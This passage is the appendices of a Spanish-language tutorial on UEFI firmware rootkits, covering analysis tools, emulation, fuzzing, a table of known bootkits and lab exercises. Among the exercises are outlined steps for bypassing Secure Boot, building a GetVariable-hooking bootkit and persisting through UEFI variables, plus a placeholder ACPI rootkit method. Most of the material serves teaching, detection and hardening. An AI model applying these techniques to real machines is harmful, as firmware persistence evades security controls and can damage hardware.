- UEFI Specification (uefi.org)
- Intel ME Firmware Specification
- AMD PSP Technical Reference
- TCG PC Client Platform Firmware Profile

**Herramientas:**
- UEFITool: [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://github.[com](../raw/w1n-s9bsyst3ms.md#com)/LongSoft/UEFITool
- CHIPSEC: https://github.com/chipsec/chipsec
- Flashrom: https://www.flashrom.org/
- FirmWire: https://github.com/grimm-co/FirmWire
- SBAT: https://github.com/rhboot/shim

**Investigacion:**
- "A Firmware Rootkit" - Skochinsky ([recon](../raw/0s1nt.md#reconocimiento) 2011)
- "Hacking the UEFI" - Brossard (HITB 2014)
- "The Death of BIOS" - Lutas (Blackhat 2015)
- "Bootkits Revisited" - Matrosov (Blackhat 2017)
- "SMM Rootkits" - Bazhaniuk (Blackhat 2018)
- "Intel ME Secrets" - Ermolov (2020)
- "BlackLotus: The First UEFI [bootkit](../raw/u3f1-r00tk1ts.md#bootkits) that Bypasses Secure Boot" - ESET (2023)

### Apendice D: Analisis de Firmware con [ghidra](../raw/4pk-r3v3rs1ng.md#ghidra)

```bash
# Descompilar drivers UEFI con Ghidra
# 1. Crear proyecto Ghidra
# 2. Importar driver .efi
# 3. Language: x86-64 (o IA-32)
# 4. Analisis: auto-analysis

# Extension para UEFI en Ghidra:
# - UEFI Analyzer: parsea PE con subsystem EFI
# - Reconoce protocolos UEFI
# - Nombra funciones conocidas (gBS->LocateProtocol, etc.)

# Analisis manual:
# 1. Buscar strings: "password", "key", "secure", "boot"
# 2. Buscar GUID de protocolos
# 3. Identificar entry point
# 4. Buscar referencias a NVRAM variables
```

### Apendice E: Firmware Emulation con QEMU

```bash
# Emular firmware UEFI completo:
# 1. Compilar OVMF (UEFI firmware para QEMU)
git clone https://github.com/tianocore/edk2
cd edk2
source edksetup.sh
build -a X64 -p OvmfPkg/OvmfPkgX64.dsc

# 2. Arrancar firmware en QEMU
qemu-system-x86_64 -bios Build/OvmfX64/RELEASE_GCC5/FV/OVMF.fd \
    -hda fat:rw:./esp -m 1024

# 3. Cargar driver personalizado en UEFI Shell
Shell> load fs0:\dxe_payload.efi
Shell> dh -p <GUID>  # Ver protocolos instalados
```

### Apendice F: [fuzzing](../raw/fuzz1ng.md) de Firmware UEFI

```python
import subprocess
import random
import struct

class UEFIFuzzer:
    def __init__(self, firmware_path):
        self.firmware_path = firmware_path
        with open(firmware_path, 'rb') as f:
            self.data = bytearray(f.read())
    
    def fuzz_bit_flip(self, iterations=10000):
        """Voltear bits aleatorios en el firmware"""
        for _ in range(iterations):
            pos = random.randint(0, len(self.data) - 1)
            bit = 1 << random.randint(0, 7)
            original = self.data[pos]
            self.data[pos] ^= bit
            yield bytes(self.data)
            self.data[pos] = original
    
    def fuzz_field(self, field_offset, field_size):
        """Fuzzear un campo especifico (ej: checksum, tamano)"""
        original = self.data[field_offset:field_offset+field_size]
        for value in range(256):
            mutated = bytearray(self.data)
            mutated[field_offset:field_offset+field_size] = struct.pack('<B', value)
            yield bytes(mutated)
```

### Apendice G: Rootkits UEFI Conocidos

| Rootkit | Ano | Vector | [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) | Deteccion |
|---------|-----|--------|-------------|-----------|
| BlackLotus | 2023 | Secure Boot bypass ([cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2022-21894) | ESP | CHIPSEC |
| MoonBounce | 2022 | SPI flash overwrite | Firmware SPI | Hardware dump |
| ESPecter | 2021 | ESP bootloader infection | ESP | UEFITool |
| TrickBoot | 2020 | UEFI firmware write | SPI flash | CHIPSEC |
| LoJack | 2009 | AMI firmware module | SPI flash | BIOS scan |
| DerStarke | 2019 | SMM vulnerability | SMRAM | CHIPSEC |
| InvisiMole | 2018 | DXE driver injection | Firmware FV | UEFITool |

### Apendice H: Taller de Rootkits UEFI

**Ejercicio H.1: Analisis de Firmware Real**
1. Obten un dump de firmware de una laptop real (o usa sample publico)
2. Identifica todas las regiones SPI: BIOS, ME, GbE
3. Lista todos los DXE drivers y sus GUIDs
4. Busca certificados de prueba (test keys) en el firmware
5. Extrae 3 drivers y analizalos con Ghidra

**Ejercicio H.2: Bypass de Secure Boot**
1. Crea un certificado auto-firmado
2. Agrega el certificado a la DB usando efi-updatevar
3. Firma un bootloader personalizado
4. Verifica que Secure Boot ahora lo acepta

**Ejercicio H.3: Creacion de Bootkit Simple**
1. Compila un DXE driver que hookee GetVariable
2. El hook debe ocultar una [variable](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#variables) especifica
3. Inserta el driver en el firmware con UEFITool
4. Emula con QEMU/OVMF para probar

**Ejercicio H.4: Deteccion de Bootkits**
1. Usa CHIPSEC para escanear un firmware
2. Interpreta los resultados: que configuraciones inseguras encontraste?
3. Crea un script de hardening basado en los hallazgos
4. Compara la salida antes y despues del hardening

### Apendice I: Intel FSP (Firmware Support Package)

```bash
# Intel FSP es un conjunto de binarios que inicializan CPU, memory controller y chipset
# OEMs integran FSP en sus firmwares

# Componentes FSP:
# - FSP-T: Temp RAM init (Cache-as-RAM)
# - FSP-M: Memory init (DDR training)
# - FSP-S: Silicon init (CPU features)

# Extraer FSP de firmware:
UEFITool firmware.bin -extract -type FSP
# Analizar con FSP analysis tools
python3 fsp_analyzer.py fsp.bin
```

### Apendice J: DMI/SMBIOS Manipulacion

```bash
# SMBIOS contiene informacion del hardware (fabricante, modelo, serial)
# Accesible desde el SO sin privilegios
# Se puede usar para fingerprinting

# Leer SMBIOS:
dmidecode -t 0  # BIOS info
dmidecode -t 1  # System info
dmidecode -t 2  # Baseboard info
dmidecode -t 17 # Memory modules

# Modificar (requiere acceso a firmware):
# - Usar UEFITool para modificar datos SMBIOS
# - Cambiar serial number, fabricante, etc.
```

### Apendice K: ACPI Manipulacion

```bash
# ACPI (Advanced Configuration and Power Interface) define tablas
# que describen hardware al SO

# Tablas principales:
# - DSDT: Differentiated System Description Table
# - SSDT: Secondary System Description Table
# - FACP: Fixed ACPI Description Table
# - MADT: Multiple APIC Description Table

# Analizar/extraer:
acpixtract -a firmware.bin
iasl -d dsdt.dat  # Decompilar DSDT

# Ataques:
# - Modificar DSDT para ocultar dispositivos
# - SSDT injection para cargar codigo
# - Manipular _OSI para evadir deteccion

# ACPI rootkit: modificar metodos ACPI para ejecutar payload
Method (_SB.PCI0.MCHC.SECR, 0, Serialized) {
    // Codigo malicioso ejecutado por el SO al evaluar este metodo
    Store (0xCA, Local0)
    Return (Local0)
}
```

### Apendice L: Intel Boot Guard

```bash
# Intel Boot Guard verifica la firma del firmware inicial
# Las claves se queman en fuses (efuses) de la CPU

# Modos Boot Guard:
# 1. Verified Boot: verifica firma, si falla no arranca
# 2. Measured Boot: mide pero no bloquea
# 3. Unlocked: sin verificacion

# Leer estado:
chipsec_main -m common.secureboot
# Buscar "Boot Guard" en output

# Verificar claves:
# Intel FIT (Firmware Interface Table) contiene punteros a claves

# Bypass (requiere acceso fisico):
# - Voltage glitching en CPU fuses
# - Reballing CPU para reemplazar
# - Exploit en Intel ME (si existe)
```

### Apendice M: Ejercicios Avanzados de Laboratorio

**Ejercicio M.1: Firmware Reversing Marathon**
1. Obten un firmware de laptop de 2019+
2. Extrae todos los DXE drivers con UEFITool
3. Descompila 5 drivers con Ghidra
4. Identifica que protocolos usan
5. Busca vulnerabilidades: [buffer overflow](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#buffer-overflow), format string
6. Crea PoC de [vulnerabilidad](../raw/s3c-f0nd4m3nt0s.md#vulnerabilidades) encontrada (en emulador)

**Ejercicio M.2: Bootkit Detection Challenge**
1. Prepara dos firmwares: uno limpio, uno infectado
2. Usa CHIPSEC para escanear ambos
3. Compara resultados: que cambia entre sano e infectado?
4. Usa FirmWire para emular el firmware infectado
5. Detecta comportamiento anomalo en emulacion

**Ejercicio M.3: Firmware Hardening**
1. Toma un firmware de una laptop de consumo
2. Identifica todas las configuraciones inseguras
3. Crea parches para: deshabilitar puertos debug, habilitar Secure Boot, bloquear SMM
4. Aplica los parches con UEFIPatch
5. Verifica con CHIPSEC que las configuraciones cambiaron

**Ejercicio M.4: Supply Chain Verification**
1. Descarga firmware oficial de 3 fabricantes (Dell, Lenovo, HP)
2. Verifica firmas digitales de cada uno
3. Compara hashes publicados vs descargados
4. Busca discrepancias en certificados
5. Documenta el [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) de verificacion

**Ejercicio M.5: UEFI Variable Exploitation**
1. Lista todas las variables UEFI en un sistema
2. Identifica variables con atributos inseguros (sin auth)
3. Intenta modificar variables de boot
4. Documenta: que variables se pueden modificar, con que impacto
5. Crea PoC de persistencia via UEFI variable abuse

> **Disclaimer final:** Este tutorial es con fines educativos. Manipular firmware puede danar permanentemente el hardware. Solo realizar estas tecnicas en equipos propios o con [autorizacion](../raw/s3c-f0nd4m3nt0s.md#autorizacion) explicita.

